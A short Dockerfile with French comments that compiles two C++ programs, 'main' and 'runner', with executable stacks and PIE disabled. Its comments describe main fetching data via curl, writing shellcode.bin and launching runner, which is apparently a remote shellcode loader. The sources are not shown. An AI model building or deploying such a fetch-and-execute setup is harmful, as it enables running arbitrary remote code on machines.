FROM gcc:12

WORKDIR /app

# Installer curl (main utilise system("curl ..."))
RUN apt-get update -qq && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y -qq curl && \
    rm -rf /var/lib/apt/lists/*

# Copier les sources
COPY main.cpp /app/main.cpp
COPY runner.cpp /app/runner.cpp

# Compiler les deux binaires
# -z execstack et -no-pie pour autoriser du code exécutable en mémoire si nécessaire
RUN g++ -z execstack -no-pie main.cpp -o /usr/local/bin/main \
 && g++ -z execstack -no-pie runner.cpp -o /usr/local/bin/runner \
 && chmod +x /usr/local/bin/main /usr/local/bin/runner

# Lancer le main (qui fera le fetch, écrira shellcode.bin, puis pourra lancer runner)
ENTRYPOINT ["/usr/local/bin/main"]
